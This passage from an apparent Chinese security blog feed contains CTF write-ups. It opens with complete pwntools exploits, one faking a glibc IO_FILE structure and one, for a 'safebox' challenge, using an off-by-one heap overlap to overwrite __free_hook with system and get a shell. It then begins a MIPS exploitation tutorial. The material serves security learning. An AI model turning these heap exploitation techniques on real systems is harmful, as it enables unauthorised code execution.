punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">stdin</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">stderr</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>stdout<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c2600</span><span class="token comment" spellcheck="true"># gdb.attach(io)</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>_IO_2_1_stderr_ <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stderr_'</span><span class="token punctuation">]</span>binsh_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>_IO_str_jumps <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x3be4c0</span>_IO_2_1_stdin_ <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>_IO_2_1_stdout_ <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stderr_ => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>_IO_2_1_stderr_<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'binsh_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'_IO_str_jumps => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>_IO_str_jumps<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stdin_ => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>_IO_2_1_stdin_<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stdout_ => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>_IO_2_1_stdout_<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''payload=p64(0)*7+p64(system_addr)stderr(len(payload),payload)payload='/bin/sh\x00'+p64(libc_base+0x3c56a3)*7+p64(libc_base+0x3c56a4)+p64(0)*4payload+=p64(_IO_2_1_stdin_)+p64(1)+p64(0xffffffffffffffff)+p64(0xa000000)+p64(libc_base+0x3c6780)payload+=p64(0xffffffffffffffff)+p64(0)+p64(libc_base+0x3c47a0)+p64(0)*3payload+=p64(0x00000000ffffffff)+p64(0)*2+p64(_IO_2_1_stderr_)#gdb.attach(io)stdout(len(payload),payload)'''</span>fake_file <span class="token operator">=</span> IO_FILE_plus<span class="token punctuation">(</span><span class="token punctuation">)</span>fake_file<span class="token punctuation">.</span>_flags <span class="token operator">=</span> <span class="token number">0</span>fake_file<span class="token punctuation">.</span>_IO_buf_base <span class="token operator">=</span> binsh_addrfake_file<span class="token punctuation">.</span>_IO_write_base <span class="token operator">=</span> <span class="token number">0</span>fake_file<span class="token punctuation">.</span>_IO_write_ptr <span class="token operator">=</span> <span class="token number">1</span>fake_file<span class="token punctuation">.</span>_mode <span class="token operator">=</span> <span class="token number">0</span>fake_file<span class="token punctuation">.</span>vtable <span class="token operator">=</span> _IO_str_jumps<span class="token number">-8</span>payload <span class="token operator">=</span> str<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xe8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>stdout<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'256'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(io)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>fake_file按照条件进行构造，这只是修改了stdout结构体，我们还需要触发<code>_IO_flush_all_lockp</code>，前面说过，要触发<code>_IO_flush_all_lockp</code>除了libc执行abort函数时，当程序执行exit时也会触发(跟进exit函数调试会发现exit函数调用了<code>_IO_flush_all_lockp</code>)。题目中，当我们输入的size大于0xf0时就会执行exit函数，于是我们将输入size为256就可以getshell，由于stdout结构体已经被我们修改，我们看不到程序的回显，但程序依然是可以执行的。</p><p>对比2.23和2.24下的利用手法，可以看到2.24下的利用方式更加简便</p><p>除了利用IO_FILE来getshell，当程序没有输出函数时，我们也可以利用<code>_IO_2_1_stdout_</code>结构体来泄露libc地址，具体原理可以看ex师傅的<a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">利用 <em>IO_2_1_stdout</em> 泄露信息</a>，写的很详细</p><h3 id="0x3-safebox"><a href="#0x3-safebox" class="headerlink" title="0x3.safebox"></a>0x3.safebox</h3><p>保护全开，libc2.27</p><p>有两个功能，add和delete</p><p>其中add功能存在off-by-one，很明显</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sub_B2C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> __int64 v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-18h]</span>  <span class="token keyword">unsigned</span> __int64 size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"idx:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">sub_A84</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">0xF</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"error."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"len:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  size <span class="token operator">=</span> <span class="token function">sub_A84</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> size <span class="token operator">></span> <span class="token number">0xFFF</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"error."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  qword_202040<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> size <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  qword_2020C0<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"content:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> qword_2020C0<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">,</span> qword_202040<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>delete函数没问题，free且指针清零</p><p>那么利用方式就是off-by-one构造出overlap，然后在tcache上踩出main_arena的地址，修改后四位为stdout结构体的后四位，1/16的几率能分配过去，然后用来修改stdout的payload为<code>p64(0xfbad1887)+p64(0)*3+p8(0)</code>,就能够泄露出libc地址。有了地址之后，再来一次overlap，将tcache的fd修改为freehook，申请到freehook并修改为system，完整exp如下</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'safebox'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'idx:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'len:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'idx:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#off-by-one，修改chunk1的size为chunk1+chunk2+chunk3</span>    dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#将chunk2放入tcache</span>    dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#将chunk1放入unsorted bin</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#申请回chunk1，使main_arena落入chunk2的fd</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> p16<span class="token punctuation">(</span><span class="token number">0x7760</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#这里我们需要申请大于或者小于chunk2的chunk，否则便会从tcache中取chunk，fd便会失效；将fd的后四位修改为_IO_2_1_stdout_地址的后四位</span>    add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#修改_IO_2_1_stdout_</span>    add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ed8b0</span>    <span class="token keyword">if</span> libc_base <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">0x3ed8b0</span><span class="token punctuation">:</span>        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>    free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'free_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#将剩下的unsorted bin申请出来</span>    add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    dele<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#继续off-by-one</span>    dele<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>    dele<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    dele<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(io)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> io        <span class="token keyword">try</span><span class="token punctuation">:</span>            io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./safebox'</span><span class="token punctuation">)</span>            pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文用于记录IO_FILE的利用原理思路以及构造模板&lt;/p&gt;
    
    </summary>
    
    
      <category term="二进制" scheme="https://lawliet.ren/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
    
      <category term="IO_FILE" scheme="https://lawliet.ren/tags/IO-FILE/"/>
    
  </entry>
  
  <entry>
    <title>MIPS PWN学习</title>
    <link href="https://lawliet.ren/2020/08/04/lock-mipspwn-xue-xi/"/>
    <id>https://lawliet.ren/2020/08/04/lock-mipspwn-xue-xi/</id>
    <published>2020-08-04T03:51:17.000Z</published>
    <updated>2020-08-31T00:27:12.345Z</updated>
    
    <content type="html"><![CDATA[<p>​        MIPS架构常用于路由器设备，而路由器固件漏洞大部分都是栈溢出，因此，掌握MIPS架构下的漏洞利用对于挖掘利用路由器漏洞也是很重要的一项技能。</p><a id="more"></a><p>准备环境及工具：</p><ul><li><strong>Ubuntu16</strong>虚拟机(Ubuntu14或者Ubuntu18也可以，不过推荐使用Ubuntu16，我用18装环境遇到了很多奇奇怪怪的问题)</li><li><strong>buildroot</strong>交叉编译环境，由于<strong>buildroot</strong>只能编译大端序或者小端序一种架构的环境，这里推荐安装<strong>gcc-mipsel-linux-gnu</strong>和<strong>gcc-mips-linux-gnu</strong>，直接apt安装就可以，使用方法和gcc一样</li><li><strong>gdb-multiarch</strong>，提供多架构的调试，直接apt安装，再装一个<strong>pwndbg</strong>或者<strong>peda</strong>或者<strong>gef</strong>插件使用更方便，使用方法：<strong>qemu-mips/qemu-mipsel -L lib/ -g 1234(端口号) ./bin</strong> ,然后<strong>gdb-multiarch ./bin</strong>加载程序，gdb会自动识别程序架构，然后用<strong>target remote:127.0.0.1:1234</strong>来连接qemu进行调试即可。当然，用IDA连接也是可以，<strong>Debugger-&gt;Remote GDB Debugger</strong>然后填上ip端口号和文件路径就行了</li><li>IDA插件，<strong>mipsrop</strong>，开源在GitHub上，由于mips指令和x86指令存在差别，mips指令没有类似于push、pop这种直接使数据入栈出栈的指令，只有<strong>lw(load word)</strong>，<strong>sw(save word)</strong>之类的指令来进行数据的转移，于是我们要在栈上进行操作就有很多种方式，用<strong>ROPgadget</strong>来搜索会很麻烦，而<strong>mipsrop</strong>会将<strong>gadgets</strong>进行分类以及不同的<strong>gadget</strong>使用后导致的结果显示出来，使用起来要方便的多。</li><li><strong>Ghidra</strong>，将mips汇编反编译为c伪代码，<strong>jeb</strong>也有mips反编译功能，不过对比了一下觉得<strong>Ghidra</strong>的效果更好(IDA7.5也新增了mips反编译功能，不过……贫穷使我望而却步)</li></ul><p>​       简单说一下mips架构的寄存器及作用。mips32一共有32个通用寄存器，用<strong>$0-$31</strong>表示。<strong>$4-$7</strong>寄存器用作函数传参，记为<strong>$a0-$a3(argument)</strong>,超出四个参数的用栈传参;<strong>$28</strong>寄存器记为<strong>$gp(global pointer)</strong>,这是一个全局指针，各种函数调用之类都靠$gp寻址;<strong>$29</strong>记为<strong>$sp(stack pointer)</strong>,作用和x86架构的sp寄存器一样，指向栈顶;<strong>$30</strong>记为<strong>$fp(fram pointer)</strong>,或者记为<strong>$s8</strong>，这个寄存器类似于x86架构的ebp指针，指向栈底;<strong>$31</strong>记为<strong>$ra(return address)</strong>，类似于x86架构的eip寄存器，保存返回地址，我们的攻击目标就是劫持$ra寄存器。我们进行利用常用的就这些寄存器。</p><p>接下来上题</p><h2 id="0x1-rootme-ELF-MIPS-Stack-buffer-overflow-No-NX"><a href="#0x1-rootme-ELF-MIPS-Stack-buffer-overflow-No-NX" class="headerlink" title="0x1.rootme-ELF MIPS - Stack buffer overflow - No NX"></a>0x1.rootme-ELF MIPS - Stack buffer overflow - No NX</h2><p>题目只给我们mips的汇编代码，所以我们需要由汇编编译出可执行文件</p><pre class=" language-assembly"><code class="language-assembly">.set    nomips16    .global __start    .text__start:    la      $t9, function    